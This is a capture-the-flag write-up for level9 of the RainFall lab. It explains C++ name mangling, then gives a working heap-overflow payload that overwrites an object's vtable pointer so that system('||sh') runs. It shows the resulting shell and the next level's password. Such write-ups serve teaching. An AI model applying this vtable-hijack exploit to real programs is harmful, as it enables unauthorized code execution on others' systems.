##  Description

This level introduces a new difficulty: name mangling. If we have a look at the disassembly with `objdump -D level9`, we can see that some of the functions have been renamed with a seemingly random string of characters.

This is commonly done by compilers when compiling C++ code. Name mangling is used to encode additional information about functions, such as their parameters and namespaces, into their names. This allows for function overloading and other features of C++. It also allows two functions or more to have the same name as long as they have different parameters.

Fortunately, `objdump` as well as `gdb` can demangle these names for us to make them more readable:

```bash
level9@RainFall:~$ objdump -D level9
...
080486f6 <_ZN1NC1Ei>:
 80486f6:	55                   	push   %ebp
 80486f7:	89 e5                	mov    %esp,%ebp
 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
 8048702:	8b 45 08             	mov    0x8(%ebp),%eax
 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048708:	89 50 68             	mov    %edx,0x68(%eax)
 804870b:	5d                   	pop    %ebp
 804870c:	c3                   	ret    
 804870d:	90                   	nop
...

level9@RainFall:~$ objdump -CD level9
...
080486f6 <N::N(int)>:
 80486f6:	55                   	push   %ebp
 80486f7:	89 e5                	mov    %esp,%ebp
 80486f9:	8b 45 08             	mov    0x8(%ebp),%eax
 80486fc:	c7 00 48 88 04 08    	movl   $0x8048848,(%eax)
 8048702:	8b 45 08             	mov    0x8(%ebp),%eax
 8048705:	8b 55 0c             	mov    0xc(%ebp),%edx
 8048708:	89 50 68             	mov    %edx,0x68(%eax)
 804870b:	5d                   	pop    %ebp
 804870c:	c3                   	ret    
 804870d:	90                   	nop
...
```

Here for instance, we can see that the function `_ZN1NC1Ei` is actually `N::N(int)`, which is the constructor of a class `N` that takes an integer as a parameter.

Using `ghidra` to help us analyse and reverse engineer the binary, we can find that the class `N` has two member variables: a buffer of 100 characters and an integer value.
It also has two virtual functions: `operator+` and `operator-`, which take another instance of `N` as a parameter and return an integer.

This implies that the class `N` has a virtual table (vtable) that contains pointers to these two functions. The vtable is usually located at the beginning of the class instance in memory.

This is the estimated class declaration used:

```c++
class N {
public:
    
    void**  vtable;
    char    buffer[100];
    int     value;

    virtual int operator+(N& other);
    virtual int operator-(N& other);
};
```

So when we create an instance of `N`, the first 4 bytes will be a pointer to the vtable, followed by the buffer and the integer value.
The main function creates two instances of `N` and calls the `operator+` function on them. The `operator+` function is the first function in the vtable, so if we can overwrite the buffer of the first object with a pointer to a fake vtable that we control, we can make the program call any function we want when it tries to call `operator+`.

To do so, we can overflow the buffer of the first object with a payload that contains a pointer to a fake vtable, followed by the address of the `system` function in the first entry of the vtable, and the address of the string "||sh" in the second entry of the vtable. This way, when `operator+` is called, it will call `system("||sh")`, which will give us a shell.

If we try the payload below, we can see that the heap is correctly overwritten:

```bash
Starting program: /home/user/level9/level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "||bash\x00\x00")')

Breakpoint 1, 0x08048693 in main ()
(gdb) x/32wx 0x804a008
0x804a008:      0x08048848      0xb7d86060      0x41414141      0x41414141
                                ^ system()
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a078:      0x0804a00c      0x68737c7c      0x00000000      0x00000000
                                ^ "||sh"
```

```bash
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "||sh\x00\x00\x00\x00")')
sh: 1: 
       : not found
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

The "||sh" is used to bypass the fact that the `system` function will be called with a string containing parasite bytes and fails to find and execute the first command.
The second time, it does find the "sh" and executes it, giving us a shell. We can then read the flag from the `bonus0` user home directory.
